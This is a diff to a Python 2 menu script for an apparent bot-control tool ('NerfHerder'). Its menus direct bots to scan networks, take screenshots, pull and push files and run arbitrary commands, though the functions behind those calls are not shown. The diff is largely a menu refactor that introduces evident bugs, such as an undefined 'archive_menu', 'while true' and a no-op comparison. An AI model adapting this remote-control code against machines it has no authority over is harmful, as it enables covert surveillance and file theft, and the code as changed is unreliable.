@@ -115,13 +115,11 @@ def choice_error():
     print('Choice does not exist')
 
 def main_menu():
-    logo()
     # Print a menu with all the functionality.
     # Returns:
         # The choice of the user.
 
     # print('=' * 30 + '\n\t\t\tMENU\n' + '=' * 30)
-    print'MAIN MENU\n'
     descriptions = ['DEVICE SCANNING',
                     'MONITORING',
                     'ARCHIVE VIEWING',
@@ -138,13 +136,12 @@ def main_menu():
 
 
 
-def mon_menu():  
+def mon_menu():
     # Print a menu with all the functionality.
     # Returns:
         # The choice of the user.
 
     # print('=' * 30 + '\n\t\t\tMENU\n' + '=' * 30)
-    print'MONITOR\n'
     descriptions = ['Take Screenshots',
                     'Get File',
                     'Send File',                   
@@ -166,8 +163,8 @@ def scan_menu():
         # The choice of the user.
 
     # print('=' * 30 + '\n\t\t\tMENU\n' + '=' * 30)
-    print'SCAN FOR DEVICES\n'
-    descriptions = ['Bot Scan',
+    descriptions = ['SCAN FOR DEVICES\n',
+                    'Bot Scan',
                     'Add Bot',
                     'Back To Main Menu']
 
@@ -181,14 +178,13 @@ def scan_menu():
     return choice
 
 def arch_menu():
-    
     # Print a menu with all the functionality.
     # Returns:
         # The choice of the user.
 
     # print('=' * 30 + '\n\t\t\tMENU\n' + '=' * 30)
-    print'ARCHIVE VIEWING\n'
-    descriptions = ['View Bot Archive',
+    descriptions = ['ARCHIVE VIEWING\n',
+                    'View Bot Archive',
                     'View Archives in Folder',
                     'Delete Archive',                    
                     'Back To Main Menu']
@@ -310,44 +306,41 @@ def take_ss():
 
 
 # ---------- SCRIPT LOGO ---------- #
-
-def logo():
-	os.system('clear')
-	print("     ******************************************************************************************************************************************************************")
-	print("     *                                                                                                                                                                *")
-	print("     *                                                                                                                                                                *")
-	print("     *            NNN           NNN   EEEEEEEEEEE  RRRRRRRRRR       FFFFFFFFFFFF                                                                                      *")
-	print("     *            NNNNN         NNN   EEEEEEEEEEE  RRRRRRRRRRRR     FFFFFFFFFFFF                                                                                      *")
-	print("     *            NNN  NN       NNN   EEE          RRR        RRR   FFF                                                                                               *")
-	print("     *            NNN   NN      NNN   EEE          RRR         RRR  FFF                                                                                               *")
-	print("     *            NNN    NN     NNN   EEE          RRR         RRR  FFF                                                                                               *")
-	print("     *            NNN     NN    NNN   EEE          RRR        RRR   FFF                                                                                               *")
-	print("     *            NNN      NN   NNN   EEEEEE       RRRRRRRRRRRR     FFFFFF                                                                                            *")
-	print("     *            NNN       NN  NNN   EEEEEE       RRRRRRRRRR       FFFFFF                                                                                            *")
-	print("     *            NNN        NN NNN   EEE          RRR      RRR     FFF                                                                                               *")
-	print("     *            NNN         NNNNN   EEE          RRR       RRR    FFF                                                                                               *")
-	print("     *            NNN          NNNN   EEE          RRR        RRR   FFF                                                                                               *")
-	print("     *            NNN           NNN   EEEEEEEEEEE  RRR        RRR   FFF                                                                                               *")
-	print("     *            NNN           NNN   EEEEEEEEEEE  RRR         RRR  FFF                                                                                               *")
-	print("     *                                                                                                                                                                *")
-	print("     *                                                                                                                                                                *")
-	print("     *                                                                                                                                                                *")
-	print("     *                                             HHH         HHH   EEEEEEEEEEE   RRRRRRRRRR        DDDDDDDDD         EEEEEEEEEE    RRRRRRRRRR                       *")
-	print("     *                                             HHH         HHH   EEEEEEEEEEE   RRRRRRRRRRRR      DDDDDDDDDDD       EEEEEEEEEE    RRRRRRRRRRRR                     *")
-	print("     *                                             HHH         HHH   EEE           RRR        RRR    DDD      DDD      EEE           RRR        RRR                   *")
-	print("     *                                             HHH         HHH   EEE           RRR         RRR   DDD       DDD     EEE           RRR         RRR                  *")
-	print("     *                                             HHH         HHH   EEE           RRR         RRR   DDD        DDD    EEE           RRR         RRR                  *")
-	print("     *                                             HHH         HHH   EEE           RRR        RRR    DDD         DDD   EEE           RRR        RRR                   *")
-	print("     *                                             HHHHHHHHHHHHHHH   EEEEEE        RRRRRRRRRRRR      DDD         DDD   EEEEEE        RRRRRRRRRRRR                     *")
-	print("     *                                             HHHHHHHHHHHHHHH   EEEEEE        RRRRRRRRRR        DDD         DDD   EEEEEE        RRRRRRRRRR                       *")
-	print("     *                                             HHH         HHH   EEE           RRR      RRR      DDD        DDD    EEE           RRR      RRR                     *")
-	print("     *                                             HHH         HHH   EEE           RRR       RRR     DDD       DDD     EEE           RRR       RRR                    *")
-	print("     *                                             HHH         HHH   EEE           RRR        RRR    DDD      DDD      EEE           RRR        RRR                   *")
-	print("     *                                             HHH         HHH   EEEEEEEEEEE   RRR        RRR    DDDDDDDDDDD       EEEEEEEEEEE   RRR        RRR                   *")
-	print("     *                                             HHH         HHH   EEEEEEEEEEE   RRR         RRR   DDDDDDDDD         EEEEEEEEEEE   RRR         RRR                  *")
-	print("     *                                                                                                                                                                *")
-	print("     *                                                                                                                                                                *")
-	print("     ******************************************************************************************************************************************************************")
+print("     ******************************************************************************************************************************************************************")
+print("     *                                                                                                                                                                *")
+print("     *                                                                                                                                                                *")
+print("     *            NNN           NNN   EEEEEEEEEEE  RRRRRRRRRR       FFFFFFFFFFFF                                                                                      *")
+print("     *            NNNNN         NNN   EEEEEEEEEEE  RRRRRRRRRRRR     FFFFFFFFFFFF                                                                                      *")
+print("     *            NNN  NN       NNN   EEE          RRR        RRR   FFF                                                                                               *")
+print("     *            NNN   NN      NNN   EEE          RRR         RRR  FFF                                                                                               *")
+print("     *            NNN    NN     NNN   EEE          RRR         RRR  FFF                                                                                               *")
+print("     *            NNN     NN    NNN   EEE          RRR        RRR   FFF                                                                                               *")
+print("     *            NNN      NN   NNN   EEEEEE       RRRRRRRRRRRR     FFFFFF                                                                                            *")
+print("     *            NNN       NN  NNN   EEEEEE       RRRRRRRRRR       FFFFFF                                                                                            *")
+print("     *            NNN        NN NNN   EEE          RRR      RRR     FFF                                                                                               *")
+print("     *            NNN         NNNNN   EEE          RRR       RRR    FFF                                                                                               *")
+print("     *            NNN          NNNN   EEE          RRR        RRR   FFF                                                                                               *")
+print("     *            NNN           NNN   EEEEEEEEEEE  RRR        RRR   FFF                                                                                               *")
+print("     *            NNN           NNN   EEEEEEEEEEE  RRR         RRR  FFF                                                                                               *")
+print("     *                                                                                                                                                                *")
+print("     *                                                                                                                                                                *")
+print("     *                                                                                                                                                                *")
+print("     *                                             HHH         HHH   EEEEEEEEEEE   RRRRRRRRRR        DDDDDDDDD         EEEEEEEEEE    RRRRRRRRRR                       *")
+print("     *                                             HHH         HHH   EEEEEEEEEEE   RRRRRRRRRRRR      DDDDDDDDDDD       EEEEEEEEEE    RRRRRRRRRRRR                     *")
+print("     *                                             HHH         HHH   EEE           RRR        RRR    DDD      DDD      EEE           RRR        RRR                   *")
+print("     *                                             HHH         HHH   EEE           RRR         RRR   DDD       DDD     EEE           RRR         RRR                  *")
+print("     *                                             HHH         HHH   EEE           RRR         RRR   DDD        DDD    EEE           RRR         RRR                  *")
+print("     *                                             HHH         HHH   EEE           RRR        RRR    DDD         DDD   EEE           RRR        RRR                   *")
+print("     *                                             HHHHHHHHHHHHHHH   EEEEEE        RRRRRRRRRRRR      DDD         DDD   EEEEEE        RRRRRRRRRRRR                     *")
+print("     *                                             HHHHHHHHHHHHHHH   EEEEEE        RRRRRRRRRR        DDD         DDD   EEEEEE        RRRRRRRRRR                       *")
+print("     *                                             HHH         HHH   EEE           RRR      RRR      DDD        DDD    EEE           RRR      RRR                     *")
+print("     *                                             HHH         HHH   EEE           RRR       RRR     DDD       DDD     EEE           RRR       RRR                    *")
+print("     *                                             HHH         HHH   EEE           RRR        RRR    DDD      DDD      EEE           RRR        RRR                   *")
+print("     *                                             HHH         HHH   EEEEEEEEEEE   RRR        RRR    DDDDDDDDDDD       EEEEEEEEEEE   RRR        RRR                   *")
+print("     *                                             HHH         HHH   EEEEEEEEEEE   RRR         RRR   DDDDDDDDD         EEEEEEEEEEE   RRR         RRR                  *")
+print("     *                                                                                                                                                                *")
+print("     *                                                                                                                                                                *")
+print("     ******************************************************************************************************************************************************************")
 
 # --------- END OF SCRIPT LOGO ---------- #
 
@@ -361,36 +354,36 @@ while True:
     select = int(main_menu())
 
     if select == 0:
-	logo()
+	#scan_menu()
+	
 	while True:
 	    select_scan = int(scan_menu())
+	
+ 	    if select_scan == 0:  # View list of bots
+ 		view_bots()
 
-	    if select_scan == 0:  # Tell bot to Scan network
+	    elif select_scan == 1:  # Tell bot to Scan network
  		  ip_to_scan = raw_input('Enter a IP + CIDR (ex.: 192.168.1.0/24) >>> \n')
  		  do_scan(ip_to_scan)
-
- 	    if select_scan == 1:  # View list of bots
- 		view_bots()
    
-	    if select_scan == 2:
-		select = int(main_menu())		
-		break
-		  
+	    elif select_scan == 2:
+		  main_menu()
+		  select == 5
 
 
     if select == 1:
-	logo()
+	mon_menu()
+
 	while True:
 		select_mon = int(mon_menu())
 
-		if select_mon == 0:  # Tell bot to Screen Shot			
+		if select_mon == 0:  # Tell bot to Screen Shot
 			print'Click...Got the Shot!!\n\n'
 		        take_ss()	
 			webbrowser.open('screen.png')
 			print('\n\n\n')
-			logo()
 	
-		if select_mon == 1:  # Get File
+		elif select_mon == 1:  # Get File
 			#send_cmd('dir')
 			#change_directory = raw_input('Choose the Directory >>> \n')
 			#send_cmd('cd' + change_directory)
@@ -399,45 +392,34 @@ while True:
 		        file_to_get = raw_input('Select The File to Get >>> \n')
 		        get_file(file_to_get)
 
-		if select_mon == 2:  # Send File
+		elif select_mon == 2:  # Send File
 			files = [f for f in os.listdir('.') if os.path.isfile(f)]
 			for f in files:
 				print(f)	
 		        file_to_send = raw_input('\nSelect The File to Send >>> \n')
 		        send_file(file_to_send)
 
-		if select_mon == 3:  # Tell bot to run a command
+
+		elif select_mon == 3:  # Tell bot to run a command
 		        cmd_to_run = raw_input('CMD List (Examples)\nsleep\nls\ncd (dir)\ncat (filename)\ntree\nEnter the CMD >>>')
 		        send_cmd(cmd_to_run)
 
-		if select_mon == 4:
-			select = int(main_menu())			
-			break
+		elif select_mon == 4:
+			main_menu()
 
     if select == 2:
-	logo()
-	while True:
-		select_arch = int(arch_menu())
+	#archive_menu()
+	while true:
+		select_arch = int(archive_menu())
 
 		if select_arch == 0:
-			select = int(main_menu())			
-			break
+			main_menu()
 
-		if select_arch == 1:  # Exit the Script
-			select = int(main_menu())			
-			break
-		if select_arch == 2:  # Exit the Script
-			select = int(main_menu())			
-			break
-		if select_arch == 3:  # Exit the Script
-			select = int(main_menu())			
-			break
+		elif select == 1:  # Exit the Script
+		        os._exit(1)
 
-		if select_arch == 4:  # Exit the Script	
-			select = int(main_menu())			
-			break		
-		        
-
+		else:
+		        choice_error()
 
     if select == 3:  # Exit the Script
         os._exit(1)
